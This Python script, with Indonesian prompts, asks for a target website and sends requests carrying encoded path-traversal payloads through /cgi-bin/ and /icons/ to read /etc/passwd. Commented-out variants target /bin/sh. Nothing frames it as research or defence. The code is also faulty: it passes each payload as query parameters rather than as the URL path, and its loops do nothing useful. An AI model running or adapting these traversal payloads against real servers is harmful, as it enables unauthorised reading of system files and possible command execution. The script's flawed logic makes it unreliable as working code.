#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests

def pathnya():
    path1 = '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
    path2 = '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    path3 = '/icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd'
    path4 = '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    # ff = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
    # ff = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    # ff = "/icons/.%2e/.%2e/.%2e/.%2e/bin/sh"
    # ff = "/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    # ff = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    # ff = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    # ff = "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    return path1, path2, path3, path4

def masukannya():
    path1, path2, path3, path4 = pathnya()
    masukan = str(input("Masukan Nama Webnya: "))
    while (True):
        for a in masukan:
            if a in masukan:
                uri = requests.get('http://'+masukan, path1, verify=False, timeout=3)
                print("Webnya: ", masukan, uri.status_code)
                break
            else:
                print('Error Tahap 1')
                break
        for b in masukan:
            if b in masukan:
                uri = requests.get('http://'+masukan, path2, verify=False, timeout=3)
                print("Webnya: ", masukan, uri.status_code)
                break
            else:
                print('Error Tahap 2')
                break
        for c in masukan:
            if c in masukan:
                uri = requests.get('http://'+masukan, path3, verify=False, timeout=3)
                print("Webnya: ", masukan, uri.status_code)
                break
            else:
                print('Error Tahap 3')
                break
        for d in masukan:
            if d in masukan:
                uri = requests.get('http://'+masukan, path4, verify=False, timeout=3)
                print("Webnya: ", masukan, uri.status_code)
                break
            else:
                print('Error Tahap 4')
                break
            break
        break

pathnya()
masukannya()